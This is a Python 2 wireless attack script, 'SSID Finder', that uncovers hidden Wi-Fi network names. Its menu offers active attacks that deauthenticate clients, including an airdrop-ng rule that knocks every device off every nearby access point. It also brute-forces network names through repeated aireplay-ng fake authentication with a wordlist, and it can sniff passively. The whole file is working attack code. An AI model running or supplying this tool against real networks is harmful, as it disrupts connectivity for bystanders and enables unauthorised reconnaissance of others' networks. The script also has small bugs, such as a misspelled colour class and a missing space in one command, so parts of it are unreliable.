#!/usr/bin/env python
import subprocess, sys, binascii, re, time, os, commands
from subprocess import Popen, PIPE

############################################
# SSID Finder - leg3nd @ info-s3curity.com #
############################################
# Credit to: Tony 'albatr0ss' Di Bernardo  #
#	     Scamentology 		   #
############################################

##################  User Variables #################################
wIface = "wlan0" # Wireless Card with Injection Support
attackWait = 5 # Seconds to wait between checks, deauths, etc.
activeTimeout = 50 # Number of checks per access point in active mode
script_temp = os.getcwd() # Temporary File Folder, Best to just leave it.
wordlist = script_temp+"/router/bin/ssids" # Wordlist Location
####################################################################
version = "0.1"
rev = "9"
mIface = "mon0" # Wouldn't change this, might cause issues.

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

############################ MAIN MENU ##############################
activeSingle = 0
activeAuto = 0
active = 0
bruteforce = 0
bruteSingle = 0
bruteAuto = 0
success = 0
passive = 0 
foundSSID = []
foundBSSID = []
menuError = '0'
try:
   while 1:
    os.system('clear')
    print bcolors.OKBLUE+"\nSSID-Finder ~ "+bcolors.OKGREEN+"Version %s Rev %s" %(version, rev)
    if menuError != '0': #Menu choice out of range
      print bcolors.FAIL+'\n[!] Error: Please Choose From The Menu!!'
      menuError = '0'
    print bcolors.OKBLUE+"\nSelect Attack From Menu.."
    print bcolors.OKGREEN+"""
    1.  Auto Active Attack
    2   Single Active Attack
    3.  Auto Brute Force Attack
    4.  Single Brute Force Attack
    5.  Passive Discovery Attack
    6.  Exit SSID Finder
    """
    MenuChoice = raw_input(bcolors.OKBLUE+"Enter your choice:"+bcolors.FAIL+" ")
    # Call according functions for attacks based on choice
    if MenuChoice == '1':
      activeAuto = 1
      active = 1
      break
    elif MenuChoice == '2':
      activeSingle = 1
      active = 1
      break
    elif MenuChoice == '3':
      bruteAuto = 1
      bruteforce = 1
      break
    elif MenuChoice == '4':
      bruteSingle = 1
      bruteforce = 1
      break
    elif MenuChoice == '5':
      passive = 1
      break
    elif MenuChoice == '6':
      sys.exit(-1)
    elif MenuChoice not in range (1,5): #Check for menu error
      menuError = '1'
except KeyboardInterrupt:
  printFound()
  print bcolors.FAIL+'\n[~] SSID Finder - Exiting with elegance...'
    # Cleanup and Exit
  os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
  os.system('rm -f %s/deauth.conf 2> /dev/null'%script_temp)
  os.system('killall -9 airodump-ng airdrop-ng 2> /dev/null')
  sys.exit(-1)
############################### END MENU ######################################

def bruteSSIDs(bssid,wordlist,channel,interface):
  global foundSSID
  global foundBSSID
  global success
  os.system('airmon-ng start '+interface+' '+channel+' 1> /dev/null 2> /dev/null')
  print bcolors.OKGREEN+'[!] Attack Status: Brute Forcing Hidden Access Point ' + bssid + ' using ' + wordlist
  f = open(wordlist, 'r')
  try:
    for temp in f:
      #essid =  re.sub(r'\W+','', temp)
      #print bcolors.OKGREEN+'[!] Attack Status: Current ESSID: ' + essid
      essid = temp
      sys.stdout.write(bcolors.OKGREEN+'\r[!] Attack Status: Current ESSID: %s    ' %essid.rstrip())
      sys.stdout.flush()
      c = Popen(['aireplay-ng', '--fakeauth', '0', '--ignore-negative-one','-T 1','-a',  bssid, '-e', essid, 'mon0'], stdout=PIPE)
      output = c.stdout.read()
      finalresult = re.findall('Association successful',output)
      if finalresult:
	print bcolors.WARNING + '\n[*] Attack Success: Found Hidden ESSID: ' + essid + ' @ ' + bssid
	success = 1
	foundBSSID.append(bssid)
	foundSSID.append(essid)
	break
    if success == 0: print bcolors.FAIL + '\n[*] Attack Fail: ESSID not in ' + wordlist + ' for Access Point ' + bssid + '!'
    os.system('airmon-ng stop mon0 1> /dev/null 2> /dev/null') 
  except: os.system('airmon-ng stop mon0 1> /dev/null 2> /dev/null')

def printFound():
  # Output collected SSIDs to STDout
  if success > 0:
    print bcolors.OKGREEN + '\n[*] Outputting Cracked Hidden SSIDs...'
    x = 0
    for _ in foundSSID:
      print bcolors.OKGREEN +  '[*] Hidden SSID: '+ bcolors.WARNING + foundSSID[x] + bcolors.OKGREEN + ' @ ' +  bcolors.WARNING + foundBSSID[x]
      x+=1

hiddenBSSIDs = []
hiddenChannels = []
def hiddenScanner():
  global n
  sys.stdout.write(bcolors.OKGREEN + '\r[%d] Attack Status: Scanning for hidden access points.. ' %n)
  sys.stdout.flush()
  #print bcolors.OKGREEN + '[!] Attack Status: Scanning for hidden access points..'
  try:
    # Grab iwlist scan, parse data and store to APlist[]
    curScan = commands.getoutput('iwlist %s scan' %(wIface)) #Scan for APs
    APlist = re.findall('Cell\s\d\d.+?(?=Cell|$)',curScan,re.DOTALL)

    y=0 # Store BSSIDs into list
    bssids = [] # BSSIDs List Structure
    for _ in APlist:
      bssidParse = re.findall('\w\w:\w\w.+:\w\w',APlist[y])
      bssidFinal = "".join(bssidParse) #Remove list syntax from BSSIDs
      bssids.append(bssidFinal)
      y+=1
      
    s=0 # Store ESSIDs into list
    essids = [] # ESSID List Structure
    essids2 = [] # Dummy list for parsing
    essidParse2 = ""
    for _ in APlist:
      essidsDirty = re.findall('ESSID:..\w\w.+',APlist[s]) #Unparsed Channels
      #essidFinal = "".join(essidsDirty) #Remove list syntax from BSSIDs
      for essidsClean2 in essidsDirty:
	essidParse2 = essidsClean2.replace('ESSID:','')
      if essidParse2: essids2.append(essidParse2)
      for essidsClean in essids2:
	essidParse = essidsClean.replace('"','')
      if essidParse: essids.append(essidParse)
      s+=1

    hiddenESSIDs = []
    global hiddenBSSIDs
    x=0 # Iterate through iwlist scan data and find hidden
    for nullFilter in essids:
      foundHidden = re.findall('x00',nullFilter)
      if foundHidden:
	hiddenBSSIDs.append(bssids[x])
      x+=1
      
    z=0 # Store WPA/WPA2 Channels into list
    global hiddenChannels
    for channels in APlist:
      channelsDirty = re.findall('Channel:\d+',APlist[z]) #Unparsed Channels
      for channelsClean in channelsDirty:
	chanParse = channelsClean.replace('Channel:','')
      hiddenChannels.append(chanParse)
      z+=1
  except: pass
############################# MAIN #################################
if os.path.exists('%s/out-01.csv'%script_temp): os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
if not os.path.exists('/usr/bin/airdrop-ng') and not os.path.exists('/usr/local/bin/airdrop-ng'):
  print '[!] Error: You must install airdrop-ng for active attack to function.'
  # Cleanup and Exit
  os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
  os.system('rm -f %s/deauth.conf 2> /dev/null'%script_temp)
  os.system('killall -9 airodump-ng airdrop-ng 2> /dev/null')
  sys.exit(-1)

os.system('killall -9 wicd wicd-client 2> /dev/null 1> /dev/null ; /etc/init.d/network-manager stop 1> /dev/null 2> /dev/null')
time.sleep(.5)
os.system('ifconfig %s up'%wIface)

if passive == 1:
    if not os.path.exists('/usr/local/bin/ssidsniff') and not os.path.exists('/usr/bin/ssidsniff'):
      print bcolor.FAIL+'[!] You must have SSIDSniff installed for this attack! Get it from http://www.bastard.net/~kos/wifi/.'
    else:
      os.system('airmon-ng stop mon0 1> /dev/null 2> /dev/null; airmon-ng stop mon11> /dev/null 2> /dev/null ;airmon-ng stop mon2 1> /dev/null 2> /dev/null;airmon-ng stop mon3 1> /dev/null 2> /dev/null;airmon-ng stop mon4 1> /dev/null 2> /dev/null')
      os.system('airmon-ng start %s 1> /dev/null 2> /dev/null'%wIface)
      os.system('ssidsniff -i %s'%mIface)

# Active SSID Collection via Deauth and Packet Captures
if active == 1:
  try:
    os.system('airmon-ng stop mon0 1> /dev/null 2> /dev/null; airmon-ng stop mon11> /dev/null 2> /dev/null ;airmon-ng stop mon2 1> /dev/null 2> /dev/null;airmon-ng stop mon3 1> /dev/null 2> /dev/null;airmon-ng stop mon4 1> /dev/null 2> /dev/null')
    os.system('airmon-ng start %s 1> /dev/null 2> /dev/null'%wIface)
    # Access Point Enumeration
    if activeAuto == 1:
      n = 1
      while 1:
	hiddenScanner()
	n+=1
	if len(hiddenBSSIDs) > 0: 
	  for printAPs in hiddenBSSIDs:
	    print bcolors.OKGREEN + '\n[!] Attack Status: Found Hidden Access Point: %s' %printAPs  
	  break
    elif activeSingle == 1:
      while 1:
	singleBSSID = raw_input(bcolors.OKBLUE+"Enter target BSSID(MAC):"+bcolors.FAIL+" ")
	singleChannel = raw_input(bcolors.OKBLUE+"Enter target channel:"+bcolors.FAIL+" ")
	if singleBSSID != "" and singleChannel != "": break
      singleBSSID = singleBSSID.upper()
      hiddenBSSIDs.append(singleBSSID)

    if activeAuto == 1:
      subprocess.Popen(['xterm', '-geometry', '80x24+0-25', '-e', 'airodump-ng -w %s/out -o csv %s' %(script_temp,mIface)])
      # Create Airdrop-ng deauth config file
      if os.path.exists('%s/deauth.conf'%(script_temp)): os.remove('%s/deauth.conf'%(script_temp))
      airdropCFG = open('%s/deauth.conf'%(script_temp), 'w')
      airdropCFG.write('a/00:00:00:00:00:00|any\n')
      airdropCFG.write('d/any|any\n')
      airdropCFG.close()
      time.sleep(5)
      subprocess.Popen(['xterm', '-geometry', '80x10+0+533', '-e', 'airdrop-ng', '-n', '3', '-i', '%s'%(mIface), '-r', '%s/deauth.conf'%(script_temp), '-t', '%s/out-01.csv'%(script_temp)]) #DeAuth Everyone
    elif activeSingle == 1:
      subprocess.Popen(['xterm', '-hold','-geometry', '80x24+0-25', '-e', 'airodump-ng -c %s --bssid %s -w %s/out -o csv %s' %(singleChannel,singleBSSID,script_temp,mIface)])
      subprocess.Popen(['xterm', '-geometry', '80x10+0+533', '-e', 'while true; do aireplay-ng -0 10 --ignore-negative-one -D -a %s %s ; sleep %d ; clear ;done' %(singleBSSID,mIface,attackWait)])
      time.sleep(5)
 
    origSize = len(hiddenBSSIDs)
    csvIn = open('%s/out-01.csv'%script_temp,'r')
    csvRead = csvIn.readlines()
    try:
      n = 1
      while 1:
	for curBSSID in hiddenBSSIDs:
	  csvIn = open('%s/out-01.csv'%script_temp,'r')
	  csvRead = csvIn.readlines()
	  time.sleep(attackWait)
	  sys.stdout.write(bcolors.OKGREEN + '\r[%d] Attack Status: Checking Access Point Packets %s    ' %(n,curBSSID.rstrip()))
	  sys.stdout.flush()
	  if n >= activeTimeout and len(hiddenBSSIDs) >= 1: 
	    n = 1
	    print bcolors.FAIL + '\n[!] Attack Status: Timed out on access point.. Moving on.' ; break
	  #print bcolors.OKGREEN + '[%d] Attack Status: Checking Access Point Packets: %s'%(x,curBSSID)
	  n+=1
	  ssid = ""
	  for lines in csvRead:
	    curSSID = re.findall("%s.+\d\d\d\d-\d"%curBSSID,lines)
	    if curSSID:
	      parse = lines.split(',')
	      ssid = parse[13]
	      checkSSID = re.findall(r'\x00',lines)
	      if not checkSSID:
		print bcolors.WARNING + '\n[*] Attack Success: Found Hidden SSID: ' + ssid + ' @ ' + curBSSID
		foundBSSID.append(curBSSID)
		foundSSID.append(ssid)
		success+=1
		n=1
		hiddenBSSIDs.remove(curBSSID)
		break
	if success >= origSize and len(foundSSID) >= origSize: break
	if activeSingle == 1 and success >= 1: break
    except Exception, e: print 'Script Error: ' + str(e)
 
  except Exception, e: print 'Script Error: ' + str(e)
  except KeyboardInterrupt:
    printFound()
    print bcolors.FAIL+'\n[~] SSID Finder - Exiting with elegance...'
    os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
    os.system('rm -f %s/deauth.conf 2> /dev/null'%script_temp)
    os.system('killall -9 airodump-ng airdrop-ng xterm 2> /dev/null')
    sys.exit(-1)

# Brute Forced Based Attack
if bruteforce == 1:
  os.system('airmon-ng stop mon0 1> /dev/null 2> /dev/null; airmon-ng stop mon11> /dev/null 2> /dev/null ;airmon-ng stop mon2 1> /dev/null 2> /dev/null;airmon-ng stop mon3 1> /dev/null 2> /dev/null;airmon-ng stop mon4 1> /dev/null 2> /dev/null')
  if bruteAuto == 1:
      n = 1
      while 1: 
	hiddenScanner()
	n+=1
	if len(hiddenBSSIDs) > 0: 
	  for printAPs in hiddenBSSIDs:
	    print bcolors.OKGREEN + '\n[!] Attack Status: Found Hidden Access Point: %s' %printAPs  
	  break
      z=0
      try:
	for curBSSID in hiddenBSSIDs:
	  bruteSSIDs(curBSSID,wordlist,hiddenChannels[z],wIface)
	  z+=1
      except KeyboardInterrupt:
	printFound()
	print bcolors.FAIL+'\n[~] SSID Finder - Exiting with elegance...'
	os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
	os.system('rm -f %s/deauth.conf 2> /dev/null'%script_temp)
	os.system('killall -9 airodump-ng airdrop-ng xterm 2> /dev/null')
	sys.exit(-1)
    
  elif bruteSingle == 1:
    while 1:
      singleBSSID = raw_input(bcolors.OKBLUE+"Enter target BSSID(MAC):"+bcolors.FAIL+" ")
      singleChannel = raw_input(bcolors.OKBLUE+"Enter target channel:"+bcolors.FAIL+" ")
      if singleBSSID != "" and singleChannel != "": break
    bruteSSIDs(singleBSSID,wordlist,singleChannel,wIface)

# Output found ssids
printFound()
# Cleanup and Exit
os.system('rm -f %s/out-*.csv 2> /dev/null'%script_temp)
os.system('rm -f %s/deauth.conf 2> /dev/null'%script_temp)
os.system('killall -9 airodump-ng airdrop-ng xterm 2> /dev/null')
os.system('airmon-ng stop '+mIface+' 1> /dev/null 2> /dev/null')
  
